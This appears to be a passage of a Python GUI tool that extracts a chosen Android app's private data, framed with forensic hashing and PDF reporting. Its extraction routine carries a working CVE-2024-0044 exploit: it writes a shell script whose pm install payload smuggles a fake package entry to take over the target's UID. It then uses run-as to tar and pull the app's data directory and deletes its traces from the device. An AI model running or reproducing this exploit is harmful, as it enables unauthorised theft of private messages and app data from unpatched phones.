            Story.append(Spacer(1, 12))
            
            apps_data = [['Package Name', 'UID']]
            for app in self.apps_list[:100]:
                apps_data.append([app['package'], app['uid']])
            
            apps_table = Table(apps_data, colWidths=[5*inch, 1*inch])
            apps_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, -1), 7),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            
            Story.append(apps_table)
            
            if len(self.apps_list) > 100:
                Story.append(Spacer(1, 12))
                Story.append(Paragraph(f"... and {len(self.apps_list) - 100} more applications", styles['Italic']))
            
            doc.build(Story)
            self.write_log(f"PDF report generated successfully: {pdf_filename}", "SUCCESS")
            return pdf_path
            
        except Exception as e:
            self.write_log(f"Error generating PDF report: {e}", "ERROR")
            import traceback
            self.write_log(f"Traceback: {traceback.format_exc()}", "ERROR")
            return None
    
    def update_files_list(self, directory):
        self.files_text.config(state=tk.NORMAL)
        self.files_text.delete(1.0, tk.END)
        
        if not os.path.exists(directory):
            self.files_text.insert(tk.END, "This folder is empty.")
            self.files_text.config(state=tk.DISABLED)
            return
        
        files_found = False
        for root, dirs, files in os.walk(directory):
            for file in files:
                files_found = True
                file_path = os.path.join(root, file)
                rel_path = os.path.relpath(file_path, directory)
                mod_time = os.path.getmtime(file_path)
                mod_date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mod_time))
                file_type = os.path.splitext(file)[1] or "File"
                line = f"{rel_path:<50} {mod_date:<20} {file_type}\n"
                self.files_text.insert(tk.END, line)
        
        if not files_found:
            self.files_text.insert(tk.END, "This folder is empty.")
        
        self.files_text.config(state=tk.DISABLED)
    
    def start_extraction(self):
        package = self.selected_package.get()
        uid = self.selected_uid.get()
        
        if not package or not uid:
            messagebox.showwarning("Selection Required", "Please select an application first")
            return
        
        result = messagebox.askyesno("Confirm Extraction",
                                    f"Extract data from:\n\n"
                                    f"Application: {package}\n"
                                    f"UID: {uid}\n\n"
                                    f"WARNING: This exploit only works on Android 12/13\n"
                                    f"without March 2024 security update")
        
        if not result:
            return
        
        self.start_btn.config(state=tk.DISABLED, bg=self.bg_input)
        self.files_text.config(state=tk.NORMAL)
        self.files_text.delete(1.0, tk.END)
        self.files_text.insert(tk.END, "Extraction in progress...")
        self.files_text.config(state=tk.DISABLED)
        self.extraction_start_time = datetime.now().strftime('%d/%m/%Y %H:%M:%S (UTC-3)')
        
        threading.Thread(target=self.perform_extraction, args=(package, uid), daemon=True).start()
    
    def perform_extraction(self, package, uid):
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            self.extraction_dir = f"extraction_{package}_{timestamp}"
            os.makedirs(self.extraction_dir, exist_ok=True)
            self.create_log_file(self.extraction_dir)
            
            self.update_progress(0, 7, "Starting extraction...")
            self.write_log("=" * 80)
            self.write_log("STARTING EXTRACTION PROCESS")
            self.write_log(f"Package: {package}")
            self.write_log(f"UID: {uid}")
            self.write_log("=" * 80)
            
            apk_path = "F-Droid.apk"
            if not os.path.exists(apk_path):
                self.write_log(f"APK file not found: {apk_path}", "ERROR")
                messagebox.showerror("APK Not Found",
                                   f"{apk_path} not found\n\nDownload an APK from F-Droid.org")
                return
            
            self.write_log(f"APK file found: {apk_path}")
            
            self.update_progress(1, 7, "Step 1/6: Pushing APK to device...")
            self.write_log("STEP 1: Pushing APK to device...")
            stdout, stderr, code = self.run_adb_command(f"push {apk_path} /data/local/tmp/")
            if code != 0:
                self.write_log(f"Failed to push APK: {stderr}", "ERROR")
                messagebox.showerror("Error", f"Error pushing APK: {stderr}")
                return
            self.write_log("APK pushed successfully", "SUCCESS")
            
            self.update_progress(2, 7, "Step 2/6: Executing CVE-2024-0044 exploit...")
            self.write_log("STEP 2: Executing CVE-2024-0044 exploit...")
            payload = f'''@null
victim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null'''
            
            script_content = f'''PAYLOAD="{payload}"
pm install -i "$PAYLOAD" /data/local/tmp/{apk_path}
'''
            
            with open("exploit_script.sh", "w", newline='\n') as f:
                f.write(script_content)
            
            self.write_log("Exploit script created")
            self.run_adb_command("push exploit_script.sh /data/local/tmp/")
            
            commands = "cd /data/local/tmp/\nsh exploit_script.sh"
            subprocess.run(["adb", "shell"], input=commands, capture_output=True, text=True, timeout=30)
            
            self.write_log("Exploit executed", "SUCCESS")
            time.sleep(2)
            
            self.update_progress(3, 7, "Step 3/6: Creating backup archive...")
            self.write_log("STEP 3: Creating backup archive...")
            commands = f'''mkdir -p /data/local/tmp/wa/
touch /data/local/tmp/wa/wa.tar
chmod -R 0777 /data/local/tmp/wa/
run-as victim tar -cf /data/local/tmp/wa/wa.tar {package}
exit'''
            
            subprocess.run(["adb", "shell"], input=commands, capture_output=True, text=True, timeout=60)
            
            stdout, stderr, code = self.run_adb_command("ls -lh /data/local/tmp/wa/wa.tar", shell=True)
            if code != 0:
                self.write_log("Failed to create backup", "ERROR")
                messagebox.showerror("Error", "Failed to create backup")
                return
            
            self.write_log(f"Backup created: {stdout.strip()}", "SUCCESS")
            
            self.update_progress(4, 7, "Step 4/6: Downloading wa.tar and calculating HASH...")
            self.write_log("STEP 4: Downloading backup from device...")
            
            output_file = os.path.join(self.extraction_dir, "wa.tar")
            stdout, stderr, code = self.run_adb_command(f"pull /data/local/tmp/wa/wa.tar {output_file}")
            
            if code != 0 or not os.path.exists(output_file):
                self.write_log(f"Failed to download backup: {stderr}", "ERROR")
                messagebox.showerror("Error", f"Error downloading backup: {stderr}")
                return
            
            file_size = os.path.getsize(output_file)
            self.write_log(f"Backup downloaded: {output_file} ({file_size/1024/1024:.2f} MB)", "SUCCESS")
            
            # SIMPLIFICACIÓN: HASH DEL TAR SIN DESCOMPRIMIR
            self.write_log("Calculating SHA256 of wa.tar...")
            hash_value = self.calculate_hash256(output_file)
            hash_filename = f"{package}_{timestamp}_wa_tar_SHA256.txt"
            hash_path = os.path.join(self.extraction_dir, hash_filename)
            
            with open(hash_path, 'w') as f:
                f.write(f"File: wa.tar\n")
                f.write(f"SHA256: {hash_value}\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Package: {package}\n")
                f.write(f"Size: {file_size} bytes ({file_size/1024/1024:.2f} MB)\n")
            
            self.write_log(f"SHA256 calculated: {hash_value}", "SUCCESS")
            
            # GENERACIÓN DE REPORTE PDF (MANTENIDA)
            self.update_progress(5, 7, "Step 5/6: Generating PDF report...")
            pdf_path = self.generate_pdf_report(self.extraction_dir, package, uid)
            
            if pdf_path:
                pdf_hash = self.calculate_hash256(pdf_path)
                pdf_hash_file = pdf_path.replace('.pdf', '_SHA256.txt')
                with open(pdf_hash_file, 'w') as f:
                    f.write(f"File: {os.path.basename(pdf_path)}\n")
                    f.write(f"SHA256: {pdf_hash}\n")
                    f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                self.write_log(f"PDF hash calculated: {pdf_hash}", "SUCCESS")
            
            self.update_files_list(self.extraction_dir)
            
            self.update_progress(7, 7, "Extraction completed successfully!")
            
            self.files_text.config(state=tk.NORMAL)
            self.files_text.insert(tk.END, f"\n\n✓ Extraction completed!\n")
            self.files_text.insert(tk.END, f"✓ File: wa.tar\n")
            self.files_text.insert(tk.END, f"✓ SHA256: {hash_value}\n")
            if pdf_path:
                 self.files_text.insert(tk.END, f"✓ Report: {os.path.basename(pdf_path)}\n")
            self.files_text.insert(tk.END, f"✓ Location: {os.path.abspath(self.extraction_dir)}\n")
            self.files_text.config(state=tk.DISABLED)
            
            self.write_log("Cleaning up temporary files on device...")
            self.run_adb_command("rm -rf /data/local/tmp/wa/", shell=True)
            self.run_adb_command("rm /data/local/tmp/exploit_script.sh", shell=True)
            self.run_adb_command(f"rm /data/local/tmp/{apk_path}", shell=True)
            
            if os.path.exists("exploit_script.sh"):
                os.remove("exploit_script.sh")
            
            self.write_log("=" * 80)
            self.write_log("EXTRACTION COMPLETED SUCCESSFULLY!", "SUCCESS")
            self.write_log(f"Extraction directory: {self.extraction_dir}")
            self.write_log(f"File: wa.tar")
            self.write_log(f"SHA256: {hash_value}")
            if pdf_path:
                self.write_log(f"Report: {pdf_path}")
            self.write_log(f"Log file: {self.log_file}")
            self.write_log("=" * 80)
            
            messagebox.showinfo("Extraction Completed",
                              f"Extraction successful!\n\n"
                              f"File: wa.tar\n"
                              f"SHA256: {hash_value[:32]}...\n"
                              f"Report: {os.path.basename(pdf_path) if pdf_path else 'Failed'}\n\n"
                              f"Saved in: {self.extraction_dir}\n"
                              f"Log: {self.log_file}")
            
        except Exception as e:
            if self.log_file:
                self.write_log(f"CRITICAL ERROR: {str(e)}", "ERROR")
                import traceback
                self.write_log(f"Traceback: {traceback.format_exc()}", "ERROR")
            messagebox.showerror("Error", f"Error during extraction:\n{e}")
        
        finally:
            self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
            self.update_progress(0, 7, "")


def main():
    root = tk.Tk()
    app = AndroidExtractorGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()

